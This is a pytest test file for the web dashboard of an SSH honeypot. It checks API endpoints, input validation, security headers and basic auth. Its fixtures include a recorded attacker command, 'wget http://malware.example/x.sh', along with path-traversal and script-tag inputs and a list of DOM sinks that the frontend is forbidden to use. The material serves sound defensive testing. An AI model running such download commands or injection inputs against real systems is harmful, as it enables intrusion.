from __future__ import annotations

import base64
import re

import pytest
from fastapi.testclient import TestClient

from conftest import HOSTILE, populate
from sshhoneypot.storage import SQLiteStorage
from sshhoneypot.web import AuthSettings, create_app
from sshhoneypot.web.app import STATIC


@pytest.fixture
def db_path(tmp_path):
    path = str(tmp_path / "hp.db")
    db = SQLiteStorage(path)
    populate(db)
    db.close()
    return path


@pytest.fixture
def client(db_path):
    return TestClient(create_app(db_path, auth=AuthSettings()))


def test_summary_and_tops(client):
    s = client.get("/api/summary?days=7").json()
    assert s["days"] == 7 and s["auth_attempts"] == 6 and s["shell_sessions"] == 1
    assert client.get("/api/top-usernames").json()[0] == {"username": "root", "count": 3, "ips": 2}
    assert client.get("/api/top-passwords?limit=1").json() == [
        {"password": "123456", "count": 3, "ips": 3}
    ]
    assert client.get("/api/top-pairs").status_code == 200
    assert client.get("/api/top-ips").json()[0]["ip"] == "198.51.100.7"
    assert {c["country"] for c in client.get("/api/countries").json()} == {"CN", "US", "??"}
    assert client.get("/api/client-versions").json()[0]["sessions"] == 2
    assert client.get("/api/downloads").json()[0]["url"] == "http://malware.example/x.sh"
    timeline = client.get("/api/timeline?hours=6").json()
    assert sum(t["attempts"] for t in timeline) == 6


def test_sessions_and_transcript(client):
    recent = client.get("/api/sessions/recent").json()
    assert [r["id"] for r in recent] == ["aaaaaaaaaaa4"]
    assert len(client.get("/api/sessions/recent?shell_only=false").json()) == 4
    s = client.get("/api/sessions/aaaaaaaaaaa4").json()
    assert [c["command"] for c in s["transcript"]] == [
        "uname -a", HOSTILE, "wget http://malware.example/x.sh",
    ]  # fmt: skip
    assert s["downloads"][0]["tool"] == "wget"
    assert client.get("/api/sessions/000000000000").status_code == 404


@pytest.mark.parametrize(
    "url",
    [
        "/api/summary?days=0",
        "/api/top-ips?limit=1000",
        "/api/sessions/..%2f..%2fetc",
        "/api/sessions/<script>",
        "/api/sessions/AAAAAAAAAAAA",
    ],
)
def test_parameter_validation(client, url):
    assert client.get(url).status_code in (404, 422)


def test_hostile_input_is_returned_as_json_data_only(client):
    r = client.get("/api/sessions/aaaaaaaaaaa4")
    assert r.headers["content-type"] == "application/json"
    assert r.headers["x-content-type-options"] == "nosniff"
    body = r.json()
    assert body["login_user"] == HOSTILE  # stored and returned verbatim, as data
    # The raw response never contains a live tag outside a JSON string
    assert "<img" not in r.text.replace(r"\"", "").split('"login_user":')[0]


def test_frontend_never_renders_api_data_as_html():
    js = (STATIC / "app.js").read_text(encoding="utf-8")
    js = re.sub(r"/\*.*?\*/", "", js, flags=re.S)  # the header comment names the sinks
    js = re.sub(r"(?m)^\s*//.*$", "", js)
    for sink in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(",
                 "new Function", "setAttribute(\"on", ".href ="):  # fmt: skip
        assert sink not in js, sink
    assert "textContent" in js


def test_page_headers_and_sri(client):
    r = client.get("/")
    assert r.status_code == 200
    csp = r.headers["content-security-policy"]
    assert "default-src 'none'" in csp and "frame-ancestors 'none'" in csp
    assert "'unsafe-inline'" not in csp and "'unsafe-eval'" not in csp
    assert r.headers["x-frame-options"] == "DENY"
    assert r.headers["referrer-policy"] == "no-referrer"
    external = re.findall(r'<script src="(https://[^"]+)"\s+integrity="(sha384-[^"]+)"', r.text)
    assert external and all(url.startswith("https://cdn.jsdelivr.net/") for url, _ in external)
    assert r.text.count("<script") == len(external) + 1  # + our own /assets/app.js
    assert "<script>" not in r.text  # no inline script
    assert client.get("/assets/app.js").status_code == 200
    assert client.get("/assets/../storage.py").status_code == 404
    assert client.get("/assets/secret.txt").status_code == 404
    assert client.get("/docs").status_code == 404
    assert client.get("/openapi.json").status_code == 404


def test_missing_database_returns_503(tmp_path):
    c = TestClient(create_app(str(tmp_path / "nope.db"), auth=AuthSettings()))
    assert c.get("/api/summary").status_code == 503
    assert c.get("/healthz").json()["status"] == "ok"


def test_dashboard_is_read_only(db_path):
    c = TestClient(create_app(db_path, auth=AuthSettings()))
    assert c.post("/api/summary").status_code == 405
    assert c.delete("/api/sessions/aaaaaaaaaaa4").status_code == 405


class TestAuth:
    @pytest.fixture
    def c(self, db_path):
        return TestClient(create_app(db_path, auth=AuthSettings("admin", "hunter2")))

    def test_rejected_without_credentials(self, c):
        r = c.get("/api/summary")
        assert r.status_code == 401
        assert r.headers["www-authenticate"].startswith("Basic")
        assert c.get("/").status_code == 401
        assert c.get("/assets/app.js").status_code == 401
        assert c.get("/healthz").status_code == 200

    def test_basic_auth(self, c):
        good = base64.b64encode(b"admin:hunter2").decode()
        bad = base64.b64encode(b"admin:wrong").decode()
        assert c.get("/", headers={"Authorization": f"Basic {good}"}).status_code == 200
        assert c.get("/", headers={"Authorization": f"Basic {bad}"}).status_code == 401
        assert c.get("/", headers={"Authorization": "Basic !!!"}).status_code == 401
        assert c.get("/", headers={"Authorization": "Bearer hunter2"}).status_code == 401


def test_auth_settings_from_env(monkeypatch):
    monkeypatch.setenv("HONEYPOT_DASHBOARD_USER", "u")
    monkeypatch.setenv("HONEYPOT_DASHBOARD_PASSWORD", "p")
    s = AuthSettings.from_env()
    assert s.enabled
    assert s.check("Basic " + base64.b64encode(b"u:p").decode())
    monkeypatch.delenv("HONEYPOT_DASHBOARD_PASSWORD")
    assert not AuthSettings.from_env().enabled
